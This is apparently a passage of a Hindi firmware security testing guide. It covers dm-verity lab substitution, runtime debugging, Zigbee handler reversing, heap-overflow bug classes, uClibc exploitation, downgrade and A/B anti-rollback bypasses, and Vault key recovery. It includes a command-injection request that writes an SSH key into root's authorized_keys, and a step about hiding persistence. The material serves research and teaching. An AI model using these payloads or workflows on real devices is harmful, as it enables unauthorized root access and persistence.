एक उपयोगी validation workflow यह है:<sup>[[11]](#references)</sup>

1. Verifier/init binary से हर `dm-linear` segment का source device, start sector और length पता करें।
2. Alignment semantics बदले बिना extents को concatenate या map करें।
3. अगर extraction फिर भी विफल हो, तो अनुमानित boundary के आसपास केवल एक छोटी window में खोजें और केवल एक plausible superblock को स्वीकार करने के बजाय लगातार कई valid metadata structures की पुष्टि करें।
4. Reconstructed image पर बिना बदलाव वाला `unsquashfs` चलाएँ; सभी directories और fragments को सफलतापूर्वक traverse करना, `unsquashfs -stat` से अधिक ठोस प्रमाण है।

#### Analyst-controlled dm-verity replacement

जब analyst के नियंत्रण में QEMU kernel, initramfs और virtual disks हों, तो vendor के verification PID 1 की जगह एक छोटे statically linked init को रखकर modified root boot किया जा सकता है। यह **lab boot-chain substitution** है, dm-verity, उसके RSA signature, Secure Boot या TPM-sealed key को तोड़ना नहीं।<sup>[[11]](#references)</sup>

Replacement init को मूल boot path के operational हिस्सों की नकल करनी चाहिए: `devtmpfs` mount करना, `setsid()` call करना, `/dev/console` को file descriptors 0–2 से जोड़ना, `/proc` और `/sys` mount करना, दिए गए block device के उपलब्ध होने तक प्रतीक्षा करना, edited root को read-only mount करना, पुराने root के pseudo-filesystems को detach करना, नए mount को `/` पर ले जाना, `chroot` करना और firmware के मूल `/sbin/init` को `execve()` करना। `MS_MOVE` से **पहले** `/dev`, `/proc` और `/sys` को detach करने से नए root के mount points गलती से detach नहीं होते।<sup>[[11]](#references)</sup>

Mutable device state को modified immutable root से अलग रखें। एक qcow2 overlay मूल disk की LVM state को सुरक्षित रख सकता है, जबकि दूसरी read-only virtio disk edited SquashFS उपलब्ध कराती है:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### ऑफ़लाइन image-state debugging

जब धीमे बूट, विनाशकारी startup scripts या अविश्वसनीय console logging के कारण विफलता का पता लगाना मुश्किल हो, तो guest के बाहर persistent state की जाँच करें। कभी भी ऐसा overlay attach न करें जिसका उपयोग कोई running VM कर रही हो; उसे `qemu-nbd` से expose करें, LVM discovery को इच्छित NBD partition तक सीमित रखें, और डिस्कनेक्ट करने से पहले volume group को deactivate करें।<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

दोहराए जा सकने वाले fault isolation के लिए, timestamp वाले marker files किसी स्थिर writable volume में लिखें और उन्हें offline सत्यापित करें; `/dev/kmsg`, FIFOs और अस्थायी consoles, rate limiting या process के जल्दी बंद हो जाने से false negatives दे सकते हैं। असंबंधित code बदलने से पहले, विभिन्न layers के exact interfaces की तुलना भी करें: `uname -r` बनाम `/lib/modules/`, डिस्क पर मौजूद ext4 features बनाम kernel configuration, और Mesa `libGL` generation बनाम DRI driver ABI तथा PCI से निकले driver names। कोई component मौजूद हो सकता है और `dlopen()` सफलतापूर्वक कर सकता है, फिर भी इस्तेमाल के लायक न हो, क्योंकि उसका consumer किसी अलग ABI की अपेक्षा करता है।<sup>[[11]](#references)</sup>

## Dynamic Analysis व्यवहार में

इस चरण में, विश्लेषण के लिए किसी वास्तविक या emulated device environment का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। Emulation हार्डवेयर के साथ होने वाली interactions की हूबहू नकल नहीं कर सकता, इसलिए कभी-कभी emulation को फिर से शुरू करना पड़ सकता है। विश्लेषण में filesystem की दोबारा जाँच, exposed webpages और network services का exploit, तथा bootloader की vulnerabilities का पता लगाना शामिल होना चाहिए। संभावित backdoor vulnerabilities की पहचान के लिए firmware integrity tests महत्वपूर्ण हैं।

## Runtime Analysis Techniques

Runtime analysis में किसी process या binary के operating environment के भीतर उससे interaction करना शामिल है। इसके लिए breakpoints सेट करने और fuzzing तथा अन्य techniques के ज़रिए vulnerabilities की पहचान करने हेतु gdb-multiarch, Frida और Ghidra जैसे tools का उपयोग किया जाता है।

पूर्ण debugger के बिना embedded targets के लिए, device पर **statically-linked `gdbserver` की copy करें** और उससे remotely attach करें:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor message mapping

IoT hubs में RF stack अक्सर **radio MCU** और Linux userland process के बीच विभाजित होता है। एक उपयोगी workflow है इस path को map करना:<sup>[[8]](#references)</sup>

1. हवा में **RF frame**
2. radio MCU पर **controller-side parser**
3. Linux को forward किया गया **serial/UART text या TLV protocol** (उदाहरण के लिए `/dev/tty*`)
4. मुख्य daemon में **application dispatcher**
5. **protocol-specific handler / state machine**

इस architecture में एक के बजाय reversing के दो targets बनते हैं। यदि controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो इन चीज़ों का पता लगाएँ:

- **message groups** और dispatch tables
- कौन-से messages **network** से आ सकते हैं और कौन-से स्वयं controller से
- सटीक **manufacturer-specific discriminator fields** (उदाहरण के लिए Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन-से handlers केवल **commissioning**, discovery या firmware/model download phases के दौरान reachable होते हैं

विशेष रूप से Zigbee के लिए, pairing traffic capture करें और जाँचें कि क्या target अभी भी default **Link Key** `ZigBeeAlliance09` पर निर्भर है। यदि ऐसा है, तो commissioning traffic sniff करने से **Network Key** सामने आ सकती है। Zigbee 3.0 install codes इस exposure को कम करते हैं, इसलिए ध्यान दें कि जाँचा गया device वास्तव में उन्हें enforce करता है या नहीं।

### Manufacturer-specific protocol handlers और FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं, क्योंकि वे कम battle-tested validation वाले **custom parsing code** और internal **FSMs** तक पहुँचते हैं।<sup>[[8]](#references)</sup>

व्यावहारिक workflow:

- **vendor-only handler** मिलने तक command dispatcher को reverse करें।
- **FSM state**, **event**, **check**, **action** और **next-state** tables का पता लगाएँ।
- ऐसे **transitional states** पहचानें जो अपने-आप आगे बढ़ते हैं, और ऐसे retry/error branches पहचानें जो अंततः attacker-controlled state को reset या free करते हैं।
- यह मानने के बजाय कि buggy handler हमेशा reachable है, पुष्टि करें कि daemon को vulnerable state में लाने के लिए किन वैध protocol exchanges की आवश्यकता है।

Timing-sensitive protocols के लिए, Python framework से packet replay बहुत धीमा हो सकता है। इससे अधिक विश्वसनीय तरीका है कि real hardware (उदाहरण के लिए **nRF52840**) पर vendor-grade stack के साथ किसी वैध device का emulation किया जाए, ताकि सही **endpoints**, **attributes** और commissioning timing उपलब्ध कराई जा सके।

### Embedded daemons में fragmented-download bug class

एक आम firmware bug class **fragmented blob/model/configuration downloads** में दिखाई देती है:<sup>[[8]](#references)</sup>

1. **पहला fragment** (`offset == 0`) `ctx->total_size` store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments केवल attacker-controlled **packet-local** fields की जाँच करते हैं, जैसे `packet_total_size >= offset + chunk_len`।
3. Copy में `memcpy(&ctx->buffer[offset], chunk, chunk_len)` का उपयोग होता है, लेकिन **original allocated size** के विरुद्ध जाँच नहीं होती।

इससे attacker ये कर सकता है:

- छोटा heap allocation करवाने के लिए छोटा declared total size वाला पहला वैध fragment भेजना।
- बाद में **expected offset** के साथ बड़ा `chunk_len` वाला fragment भेजना।
- ऐसा forged packet-local size देना जो नई checks को संतुष्ट करे, लेकिन फिर भी मूल allocated buffer को overflow कर दे।

जब vulnerable path commissioning logic के पीछे हो, तो malformed fragments भेजने से पहले target को अपेक्षित model-download या blob-download state में लाने के लिए पर्याप्त **device emulation** शामिल करना होगा।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतज़ार करना" नहीं, बल्कि **protocol की अपनी error handling को मजबूर करना** होता है:<sup>[[8]](#references)</sup>

- FSM को **retry** या **error** states में पहुँचाने के लिए malformed follow-up fragments भेजें।
- retry threshold पार करें, ताकि daemon **context reset** करे और corrupted buffer को free करे।
- process के किसी असंबंधित कारण से crash होने से पहले allocator-side primitives trigger करने के लिए इस predictable `free()` का उपयोग करें।

यह embedded Linux में **musl/uClibc/dlmalloc-जैसे** allocators के विरुद्ध विशेष रूप से उपयोगी है, जहाँ chunk metadata corrupt करने से unlink/unbin logic को write primitive में बदला जा सकता है। एक स्थिर तरीका यह है कि **size field** को corrupt करके allocator traversal को overflowed buffer के अंदर रखे गए **fake chunks** की ओर मोड़ें, बजाय इसके कि वास्तविक bin pointers को तुरंत overwrite करके process crash कर दिया जाए।

## Binary Exploitation और Proof-of-Concept

पहचानी गई vulnerabilities के लिए PoC बनाने हेतु target architecture की गहरी समझ और lower-level languages में programming की आवश्यकता होती है। Embedded systems में binary runtime protections दुर्लभ हैं, लेकिन मौजूद होने पर Return Oriented Programming (ROP) जैसी techniques आवश्यक हो सकती हैं।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc जैसे fastbins का उपयोग करता है। बाद में किया गया कोई बड़ा allocation `__malloc_consolidate()` को trigger कर सकता है, इसलिए किसी भी fake chunk को checks (उचित size, `fd = 0`, और आसपास के chunks का "in use" दिखना) पार करना होगा।<sup>[[6]](#references)</sup>
- **ASLR के तहत non-PIE binaries:** यदि ASLR enabled है, लेकिन main binary **non-PIE** है, तो binary के अंदर के `.data/.bss` addresses स्थिर रहते हैं। आप ऐसे region को target कर सकते हैं जो पहले से valid heap chunk header जैसा दिखता हो, ताकि fastbin allocation **function pointer table** पर पहुँचे।
- **Parser-stopping NUL:** JSON parse होने पर payload में `\x00` parsing रोक सकता है, जबकि trailing attacker-controlled bytes stack pivot/ROP chain के लिए बने रहते हैं।
- **`/proc/self/mem` के जरिए Shellcode:** `open("/proc/self/mem")`, `lseek()` और `write()` call करने वाली ROP chain किसी ज्ञात mapping में executable shellcode रख सकती है और उस पर jump कर सकती है।

## Firmware Analysis के लिए तैयार Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems, firmware security testing के लिए आवश्यक tools से लैस pre-configured environments उपलब्ध कराते हैं।

## Firmware analyze करने के लिए तैयार OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है, जिसका उद्देश्य Internet of Things (IoT) devices का security assessment और penetration testing करने में आपकी मदद करना है। यह सभी आवश्यक tools से लैस pre-configured environment उपलब्ध कराकर आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से मौजूद हैं।

## Firmware Downgrade Attacks और Insecure Update Mechanisms

भले ही vendor firmware images के लिए cryptographic signature checks लागू करे, **version rollback (downgrade) protection अक्सर शामिल नहीं की जाती**। यदि boot- या recovery-loader केवल embedded public key से signature verify करता है, लेकिन flash की जा रही image के *version* (या monotonic counter) की तुलना नहीं करता, तो attacker वैध रूप से **पुराना, vulnerable firmware install कर सकता है, जिस पर अब भी valid signature होता है**—और इस तरह patched vulnerabilities फिर से आ सकती हैं।<sup>[[4]](#references)</sup>

आम attack workflow:

1. **पुरानी signed image प्राप्त करें**
   * इसे vendor के public download portal, CDN या support site से लें।
   * इसे companion mobile/desktop applications से extract करें (उदाहरण के लिए Android APK में `assets/firmware/` के अंदर)।
   * VirusTotal, Internet archives, forums आदि जैसे third-party repositories से प्राप्त करें।
2. किसी भी उपलब्ध update channel के जरिए image को device पर **upload करें या serve करें**:
   * Web UI, mobile-app API, USB, TFTP, MQTT आदि।
   * कई consumer IoT devices में ऐसे *unauthenticated* HTTP(S) endpoints होते हैं जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade शुरू करते हैं।
3. Downgrade के बाद, उस vulnerability का exploit करें जिसे नए release में patch किया गया था (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. Persistence मिलने के बाद पहचान से बचने के लिए, वैकल्पिक रूप से नवीनतम image को फिर से flash करें या updates disable करें।

### उदाहरण: Downgrade के बाद Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

कमज़ोर (downgrade किए गए) firmware में, `md5` parameter को बिना sanitisation के सीधे shell command में जोड़ दिया जाता है, जिससे arbitrary commands inject किए जा सकते हैं (यहाँ—SSH key-based root access सक्षम करने के लिए)। बाद के firmware versions में एक बुनियादी character filter जोड़ा गया, लेकिन downgrade protection न होने से यह fix बेअसर हो जाता है।<sup>[[4]](#references)</sup>

### Mobile Apps से Firmware निकालना

कई vendors अपने companion mobile applications में पूरी firmware images bundle करते हैं, ताकि app Bluetooth/Wi-Fi के ज़रिए device को update कर सके। ये packages आमतौर पर APK/APEX में `assets/fw/` या `res/raw/` जैसे paths पर unencrypted रखे जाते हैं। `apktool`, `ghidra` या यहाँ तक कि साधारण `unzip` जैसे tools, physical hardware को छुए बिना signed images निकालने देते हैं।<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot डिज़ाइनों में केवल updater तक सीमित anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन केवल *updater* logic के अंदर (उदाहरण के लिए CAN पर UDS routine, recovery command, या userspace OTA agent)। अगर **bootloader** बाद में केवल image signature/CRC जाँचता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को अब भी bypass किया जा सकता है।<sup>[[7]](#references)</sup>

आम तौर पर कमज़ोर डिज़ाइन:

- Firmware metadata में version descriptor और **security ratchet** / monotonic counter, दोनों होते हैं।
- Updater image ratchet की तुलना persistent storage में रखी value से करता है और पुराने signed images को अस्वीकार कर देता है।
- Bootloader उस ratchet को **parse नहीं** करता और चुने गए slot से boot करने से पहले केवल header, CRC और signature verify करता है।
- Slot activation को अलग से partition table या per-slot generation counter में स्टोर किया जाता है और उसे सत्यापित किए गए firmware digest से **cryptographically bind नहीं** किया जाता।

इससे dual-slot systems में **एक image validate करो / दूसरी image boot करो** वाला primitive बनता है। अगर attacker updater से slot B को current signed image के ज़रिए अगला boot target mark करवा सकता है, और reboot से पहले बाद में slot B को overwrite कर सकता है, तो bootloader downgraded image को फिर भी boot कर सकता है, क्योंकि वह केवल पहले से commit किए गए slot metadata पर भरोसा करता है।

दुरुपयोग का आम तरीका:

1. Passive slot में **current signed** firmware upload करें और सामान्य validation/switch routine चलाएँ, ताकि layout उस slot को अगले active slot के रूप में mark करे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine फिर से चलाएँ।
3. Stale boot-state या stale slot-selection logic का दुरुपयोग करें, ताकि updater उसी **physical slot** को erase करे जिसे अभी-अभी promote किया गया था।
4. उस slot में **पुराना लेकिन अब भी signed** firmware लिखें।
5. Ratchet लागू करने वाली validation routine को छोड़कर सीधे reboot करें।
6. Bootloader promoted slot चुनता है, केवल signature/integrity verify करता है और पुरानी image boot करता है।

A/B update implementations को reverse करते समय इन बातों पर ध्यान दें:

- Slot selection ऐसे **boot-time flags** से निकाला जाता है जो सफल switch के बाद refresh नहीं होते।
- `prepare_passive_slot()`-जैसी routine, **वर्तमान committed layout** के बजाय stale state के आधार पर slot erase करती है।
- `part_write_layout()`-जैसा function केवल **generation counter** / active flag बढ़ाता है और validated image hash स्टोर नहीं करता।
- Ratchet checks userspace या updater code में लागू हैं, लेकिन ROM / bootloader / secure boot stages में **नहीं**।
- Erase या recovery routines, slot का content हटाकर दोबारा लिखे जाने के बाद भी उसे bootable mark रहने देती हैं।

### Update Logic का आकलन करने के लिए Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या device flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के अंदर verify किया जाता है (उदाहरण के लिए ROM code द्वारा signatures जाँचना)?
* क्या **bootloader वही ratchet लागू करता है** जो updater करता है, या वह केवल signature/CRC जाँचता है?
* क्या slot activation metadata को **validated firmware digest/version से bind** किया गया है, या promotion के बाद slot को modify किया जा सकता है?
* Slot switch सफल होने के बाद क्या device को reboot करना अनिवार्य है, या उसी session में बाद की update/erase routines अब भी उपलब्ध हैं?
* क्या userland code अतिरिक्त sanity checks करता है (उदाहरण के लिए allowed partition map, model number)?
* क्या *partial* या *backup* update flows वही validation logic दोबारा इस्तेमाल करते हैं?

> 💡  अगर ऊपर दी गई किसी भी चीज़ की कमी है, तो platform संभवतः rollback attacks के प्रति vulnerable है।

## अभ्यास के लिए vulnerable firmware

Firmware में vulnerabilities ढूँढ़ने का अभ्यास करने के लिए, शुरुआत में निम्नलिखित vulnerable firmware projects इस्तेमाल करें।

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state से firmware decryption keys recover करना

जब कोई update image छोटे plaintext metadata को बड़े high-entropy blob के साथ मिलाती है, तो कुछ भी brute-force करने से पहले container triage करें:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` और `binwalk -E` से headers, offsets और line boundaries dump करें।
- `Salted__` का आम तौर पर मतलब OpenSSL `enc` format होता है: अगले 8 bytes salt होते हैं और बाकी bytes ciphertext।
- ऐसा Base64 field जो decode होकर ठीक `256` bytes का हो, इस बात का मज़बूत संकेत है कि वह random firmware password/session key को wrap करने वाला RSA-2048 ciphertext है।
- उसी file में मौजूद Detached PGP material अक्सर केवल authenticity की सुरक्षा करता है; यह न मानें कि वही confidentiality mechanism है।

अगर static key hunting (`grep`, `strings`, PEM/PGP searches) से कुछ न मिले, तो केवल private keys खोजने के बजाय **operational decrypt path** को reverse करें:

- Updater / management binary को decompile करें और पता लगाएँ कि encrypted blob कौन पढ़ता है, कौन-सा helper/API उसे unwrap करता है और वह किस logical key name का अनुरोध करता है।
- KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) के साथ unit files और init scripts के लिए extracted root filesystem में खोजें।
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens या local KMS auto-unseal scripts को private-key material के बराबर मानें।

अगर appliance में मूल Vault binary और storage backend शामिल हैं, तो उस environment को फिर से चलाना आम तौर पर Vault internals को दोबारा implement करने से आसान होता है:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

KMS के क्लोन पर root access के साथ:

- Transit keys को केवल आइसोलेटेड क्लोन के अंदर exportable बनाएँ: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key export करें: `vault read transit/export/encryption-key/<name>`
- रिकवर की गई RSA key को KMS में इस्तेमाल किए गए सटीक padding/hash pair के साथ आज़माएँ। PKCS#1 v1.5 decrypt और डिफ़ॉल्ट OAEP decrypt, दोनों का विफल होना इस बात का प्रमाण **नहीं** है कि key गलत है; Vault-backed कई flows में SHA-256 वाला OAEP इस्तेमाल होता है, जबकि आम libraries में डिफ़ॉल्ट SHA-1 होता है।
- अगर payload `Salted__` से शुरू होता है, तो AES-CBC decryption करने से पहले vendor के OpenSSL KDF (`EVP_BytesToKey`, legacy appliances में अक्सर MD5) को हूबहू दोहराएँ।

इससे "encrypted firmware" एक अधिक सामान्य समस्या बन जाता है: **appliance-side operational keys रिकवर करें, फिर सही unwrap + KDF parameters को offline दोहराएँ**।

## प्रशिक्षण और प्रमाणपत्र

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude से Firmware Cracking: वरिष्ठ-स्तर का कौशल, कनिष्ठ-स्तर की स्वायत्तता](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing की कार्यप्रणाली](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things पर हमले करने की निर्णायक मार्गदर्शिका](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [छोड़े जा चुके hardware में zero days का शोषण – Trail of Bits ब्लॉग](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [एक $20 के Smart Device ने मुझे आपके घर तक पहुँच कैसे दी](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [अब आप mi को देखते हैं: अब आप Pwned हैं](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector के charge port connector से शोषण - भाग 2: anti-downgrade को बायपास करना](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [इसे Blink करें: Philips Hue Bridge का Over-the-Air शोषण](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU पर Tesla OS को ROOT करना, भाग 1: Unpacking](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel documentation - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU पर Tesla OS को ROOT करना, भाग 2: Debugging और Fixing](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Passwords: कमज़ोर XOR Encryption से SPI Flash से रिकवरी संभव (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password रिकवरी के लिए tooling](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Hardware Hacking पर जानकारी ताज़ा करना, भाग 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [हमने Cypherock Hardware Wallet को कैसे और क्यों hack किया: पूरी कहानी](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
